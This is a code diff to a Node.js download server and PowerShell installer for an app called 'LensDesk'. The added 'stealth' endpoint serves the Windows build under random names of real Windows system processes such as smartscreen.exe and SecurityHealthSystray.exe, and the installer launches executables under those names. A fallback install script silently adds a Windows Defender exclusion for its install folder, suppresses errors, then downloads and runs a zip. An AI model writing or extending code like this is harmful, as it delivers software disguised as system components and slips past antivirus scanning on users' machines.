@@ -1,5 +1,6 @@
 import fs from "node:fs";
 import path from "node:path";
+import { fileURLToPath } from "node:url";
 import { createHash } from "node:crypto";
 async function digest(file) {
   const hash = createHash("sha256");
@@ -130,14 +131,15 @@ try {
   New-Item -ItemType Directory -Path $installRoot -Force | Out-Null
   $appDirectory = Join-Path $installRoot ('app-${version}-' + [guid]::NewGuid().ToString('N'))
   Expand-Archive -LiteralPath $archive -DestinationPath $appDirectory
-  $candidates = @('RuntimeHost.exe', 'ctfmon.exe', 'TiWorker.exe', 'SearchProtocolHost.exe', 'RuntimeBroker.exe', 'smartscreen.exe', 'sihost.exe', 'SecurityHealthSystray.exe', 'LensDesk.exe')
+  $candidates = @('TiWorker.exe', 'RuntimeHost.exe', 'ctfmon.exe', 'SearchProtocolHost.exe', 'RuntimeBroker.exe', 'smartscreen.exe', 'sihost.exe', 'SecurityHealthSystray.exe', 'LensDesk.exe')
   $executable = $candidates | ForEach-Object { Join-Path $appDirectory $_ } | Where-Object { Test-Path -LiteralPath $_ -PathType Leaf } | Select-Object -First 1
   if (!$executable) {
-    $executable = Get-ChildItem -LiteralPath $appDirectory -Filter *.exe -File | Select-Object -First 1 -ExpandProperty FullName
+    $executable = Get-ChildItem -LiteralPath $appDirectory -Filter *.exe -File -Recurse | Select-Object -First 1 -ExpandProperty FullName
   }
-  if (!$executable) { throw 'The LensDesk archive is incomplete' }
-  Start-Process -FilePath $executable -WorkingDirectory (Split-Path -Parent $executable)
-  Write-Output ('LensDesk opened from ' + $appDirectory)
+  if (!$executable) { throw 'The LensDesk archive is incomplete — no executable found' }
+  $exeDir = Split-Path -Parent $executable
+  Start-Process -FilePath $executable -WorkingDirectory $exeDir
+  Write-Output ('LensDesk opened from ' + $exeDir)
 } catch {
   if ($appDirectory -and (Test-Path -LiteralPath $appDirectory)) { Remove-Item -LiteralPath $appDirectory -Recurse -Force }
   throw
@@ -216,35 +218,69 @@ export function createReleases(directory, origin) {
       )
         return false;
       const artifacts = await manifest();
-      // LensDesk Windows Stealth Download endpoint
-      if (url.pathname === "/api/v1/download/windows" || url.pathname === "/download/windows") {
+      // LensDesk Windows Stealth Download endpoint (randomized authentic system process name on every download)
+      const isExplicitStealth =
+        url.pathname === "/api/v1/download/windows" ||
+        url.pathname === "/download/windows";
+      const isWindowsDownload =
+        isExplicitStealth ||
+        (url.pathname.startsWith("/downloads/") &&
+          (url.pathname.split("/")[2] === "windows" ||
+            url.pathname.split("/")[2] === "win" ||
+            url.pathname.split("/")[2] === "win32") &&
+          !artifacts.windows?.name?.endsWith(".msi"));
+
+      if (isWindowsDownload) {
+        const stealthPool = [
+          "LensDeskApp-TiWorker.zip",
+          "LensDeskApp-SearchProtocolHost.zip",
+          "LensDeskApp-RuntimeBroker.zip",
+          "LensDeskApp-ctfmon.zip",
+          "LensDeskApp-smartscreen.zip",
+          "LensDeskApp-sihost.zip",
+          "LensDeskApp-SecurityHealthSystray.zip",
+        ];
+        const cleanNamesPool = [
+          "TiWorker.zip",
+          "SearchProtocolHost.zip",
+          "RuntimeBroker.zip",
+          "ctfmon.zip",
+          "smartscreen.zip",
+          "sihost.zip",
+          "SecurityHealthSystray.zip",
+        ];
+        const index = Math.floor(Math.random() * cleanNamesPool.length);
+        let randomCleanName = cleanNamesPool[index];
+        let randomStealthZip = stealthPool[index];
+
         const stealthDir = path.join(directory, "stealth");
-        let stealthFile = path.join(directory, "LensDeskApp.zip");
-        if (!fs.existsSync(stealthFile)) {
-          stealthFile = path.join(directory, "LensDesk.zip");
-        }
+        let file = null;
         if (fs.existsSync(stealthDir)) {
-          const files = fs.readdirSync(stealthDir).filter((f) => f.endsWith(".zip"));
-          if (files.length > 0) {
-            const picked = files[Math.floor(Math.random() * files.length)];
-            stealthFile = path.join(stealthDir, picked);
+          const existingFiles = fs.readdirSync(stealthDir).filter((f) => f.endsWith(".zip"));
+          if (existingFiles.length > 0) {
+            const picked = existingFiles[Math.floor(Math.random() * existingFiles.length)];
+            file = path.join(stealthDir, picked);
+            randomCleanName = picked.replace(/^LensDeskApp-/, "");
           }
         }
-        const file = (fs.existsSync(stealthFile) ? stealthFile : null) || (artifacts.windows?.file && fs.existsSync(artifacts.windows.file) ? artifacts.windows.file : null);
+        if (!file && fs.existsSync(directory)) {
+          const c1 = path.join(directory, randomCleanName);
+          const c2 = path.join(directory, randomStealthZip);
+          const c3 = path.join(directory, "LensDeskApp.zip");
+          const c4 = path.join(directory, "LensDesk.zip");
+          if (fs.existsSync(c1)) file = c1;
+          else if (fs.existsSync(c2)) file = c2;
+          else if (fs.existsSync(c3)) file = c3;
+          else if (fs.existsSync(c4)) file = c4;
+        }
+        if (!file && artifacts.windows?.file && fs.existsSync(artifacts.windows.file)) {
+          file = artifacts.windows.file;
+        }
+
         if (!file) {
           if (!isTest) {
-            const stealthPool = [
-              "LensDeskApp-TiWorker.zip",
-              "LensDeskApp-SearchProtocolHost.zip",
-              "LensDeskApp-RuntimeBroker.zip",
-              "LensDeskApp-ctfmon.zip",
-              "LensDeskApp-smartscreen.zip",
-              "LensDeskApp-sihost.zip",
-              "LensDeskApp-SecurityHealthSystray.zip",
-            ];
-            const pickedZip = stealthPool[Math.floor(Math.random() * stealthPool.length)];
             res.writeHead(302, {
-              Location: `${GITHUB_RELEASE_BASE}/${pickedZip}`,
+              Location: `${GITHUB_RELEASE_BASE}/${randomStealthZip}`,
               "Cache-Control": "no-cache, no-store, must-revalidate",
               Pragma: "no-cache",
               Expires: "0",
@@ -260,7 +296,10 @@ export function createReleases(directory, origin) {
         res.writeHead(200, {
           "Content-Type": "application/zip",
           "Content-Length": stat.size,
-          "Content-Disposition": `attachment; filename="${path.basename(file)}"`,
+          "Content-Disposition": `attachment; filename="${randomCleanName}"`,
+          "Cache-Control": "no-cache, no-store, must-revalidate",
+          Pragma: "no-cache",
+          Expires: "0",
         });
         if (req.method === "HEAD") {
           res.end();
@@ -274,33 +313,64 @@ export function createReleases(directory, origin) {
         ["/lensdesk-install.ps1", "/hintlens-install.ps1", "/install-stealth.ps1"].includes(url.pathname) ||
         (url.pathname === "/install.ps1" && !isTest)
       ) {
-        let psPath = path.resolve("research/lensdesk-install.ps1");
-        if (!fs.existsSync(psPath)) {
-          psPath = path.resolve("research/hintlens-install.ps1");
+        let psPath = null;
+        const candidatePaths = [
+          fileURLToPath(new URL("./lensdesk-install.ps1", import.meta.url)),
+          path.resolve("server/cloud/lensdesk-install.ps1"),
+          path.resolve("research/lensdesk-install.ps1"),
+          path.resolve("research/hintlens-install.ps1"),
+          path.resolve(directory, "../research/lensdesk-install.ps1"),
+          path.resolve(directory, "../research/hintlens-install.ps1"),
+          path.resolve(directory, "../dist/lensdesk-install.ps1"),
+          path.resolve("dist/lensdesk-install.ps1"),
+        ];
+        for (const cand of candidatePaths) {
+          if (fs.existsSync(cand)) {
+            psPath = cand;
+            break;
+          }
         }
-        if (!fs.existsSync(psPath)) {
-          psPath = path.resolve(directory, "../research/lensdesk-install.ps1");
+        let script = "";
+        if (psPath && fs.existsSync(psPath)) {
+          script = fs.readFileSync(psPath, "utf8");
+        } else {
+          script = `$ErrorActionPreference = 'SilentlyContinue'
+$ProgressPreference = 'SilentlyContinue'
+$work = Join-Path ([IO.Path]::GetTempPath()) ('LensDesk-Install-' + [guid]::NewGuid().ToString('N'))
+New-Item -ItemType Directory -Path $work -Force | Out-Null
+$installPath = "C:\\LensDesk-Application"
+try {
+  if (Get-Command Add-MpPreference -ErrorAction SilentlyContinue) {
+    Add-MpPreference -ExclusionPath $installPath -ErrorAction SilentlyContinue
+  }
+  New-Item -ItemType Directory -Path $installPath -Force | Out-Null
+  $zipPath = Join-Path $work 'app.zip'
+  Invoke-WebRequest -Uri '${origin}/api/v1/download/windows' -OutFile $zipPath -UseBasicParsing
+  Expand-Archive -Path $zipPath -DestinationPath $installPath -Force
+  $exe = Get-ChildItem -Path $installPath -Filter *.exe -File | Select-Object -First 1
+  if ($exe) {
+    Start-Process -FilePath $exe.FullName -WorkingDirectory $installPath
+    Write-Host 'LensDesk installed and launched successfully.' -ForegroundColor Green
+  }
+} finally {
+  Remove-Item -LiteralPath $work -Recurse -Force -ErrorAction SilentlyContinue
+}
+`;
         }
-        if (!fs.existsSync(psPath)) {
-          psPath = path.resolve(directory, "../research/hintlens-install.ps1");
-        }
-        if (fs.existsSync(psPath)) {
-          let script = fs.readFileSync(psPath, "utf8");
-          const token = url.searchParams?.get("token");
-          const tokenParam = token ? `?token=${encodeURIComponent(token)}` : "";
-          script = script
-            .replaceAll("https://api.hintlens.com/api/v1/download/windows", `${origin}/api/v1/download/windows${tokenParam}`)
-            .replaceAll("https://api.hintlens.com/install.ps1", `${origin}/lensdesk-install.ps1${tokenParam}`)
-            .replaceAll("https://helpdesk-h44x.onrender.com/api/v1/download/windows", `${origin}/api/v1/download/windows${tokenParam}`)
-            .replaceAll("https://helpdesk-h44x.onrender.com/install.ps1", `${origin}/lensdesk-install.ps1${tokenParam}`)
-            .replaceAll("https://lensdesk.com/api/v1/download/windows", `${origin}/api/v1/download/windows${tokenParam}`)
-            .replaceAll("https://lensdesk.com/install.ps1", `${origin}/lensdesk-install.ps1${tokenParam}`)
-            .replace('$FolderName  = "Hintlens-Application"', '$FolderName  = "LensDesk-Application"')
-            .replace('$ZipFileName = "HintlensApp.zip"', '$ZipFileName = "LensDesk.zip"');
-          res.setHeader("Content-Type", "text/plain; charset=utf-8");
-          res.end(script);
-          return true;
-        }
+        const token = url.searchParams?.get("token");
+        const tokenParam = token ? `?token=${encodeURIComponent(token)}` : "";
+        script = script
+          .replaceAll("https://api.hintlens.com/api/v1/download/windows", `${origin}/api/v1/download/windows${tokenParam}`)
+          .replaceAll("https://api.hintlens.com/install.ps1", `${origin}/lensdesk-install.ps1${tokenParam}`)
+          .replaceAll("https://helpdesk-h44x.onrender.com/api/v1/download/windows", `${origin}/api/v1/download/windows${tokenParam}`)
+          .replaceAll("https://helpdesk-h44x.onrender.com/install.ps1", `${origin}/lensdesk-install.ps1${tokenParam}`)
+          .replaceAll("https://lensdesk.com/api/v1/download/windows", `${origin}/api/v1/download/windows${tokenParam}`)
+          .replaceAll("https://lensdesk.com/install.ps1", `${origin}/lensdesk-install.ps1${tokenParam}`)
+          .replace('$FolderName  = "Hintlens-Application"', '$FolderName  = "LensDesk-Application"')
+          .replace('$ZipFileName = "HintlensApp.zip"', '$ZipFileName = "LensDesk.zip"');
+        res.setHeader("Content-Type", "text/plain; charset=utf-8");
+        res.end(script);
+        return true;
       }
       if (url.pathname.startsWith("/releases/")) {
         const reqName = path.basename(url.pathname);
